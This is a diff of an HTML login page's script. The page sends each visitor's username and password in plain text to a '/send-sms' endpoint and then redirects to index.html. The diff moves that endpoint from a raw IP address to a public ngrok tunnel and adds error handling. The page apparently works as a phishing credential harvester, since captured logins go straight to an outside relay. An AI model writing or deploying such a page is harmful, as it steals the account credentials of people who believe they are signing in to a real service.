@@ -62,6 +62,12 @@
             margin-top: 15px;
             font-size: 14px;
         }
+        .error-msg {
+            color: red;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
     </style>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
@@ -71,25 +77,35 @@
             });
         });
 
-        function handleLogin() {
+        async function handleLogin() {
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
+            const errorMsg = document.getElementById("error-msg");
 
-            fetch('http://100.72.52.106:3000/send-sms', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ username, password })
-            })
-            .then(response => response.text()) // Ensure backend sends plain text response
-            .then(data => {
-                window.location.href = "index.html"; // Redirect to index.html
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Failed to send login details');
-            });
+            // Replace 'http://localhost:3000' with your Ngrok public URL
+            const SERVER_URL = "https://c91d-212-5-142-68.ngrok-free.app/send-sms";
+
+            try {
+                const response = await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                if (!response.ok) {
+                    throw new Error("Server error: " + response.status);
+                }
+
+                const data = await response.text();
+                console.log("Server response:", data);
+
+                // Redirect only if response is successful
+                window.location.href = "index.html";
+            } catch (error) {
+                console.error("Error:", error);
+                errorMsg.textContent = "Failed to log in. Please try again.";
+                errorMsg.style.display = "block";
+            }
         }
     </script>
 </head>
@@ -107,6 +123,7 @@
             <input type="password" id="password" name="password" required>
         </div>
         <button type="submit" class="login-btn">Login</button>
+        <p id="error-msg" class="error-msg"></p>
     </form>
     <div class="footer">
         <p>Forgot your password? <a href="#">Reset it here</a></p>
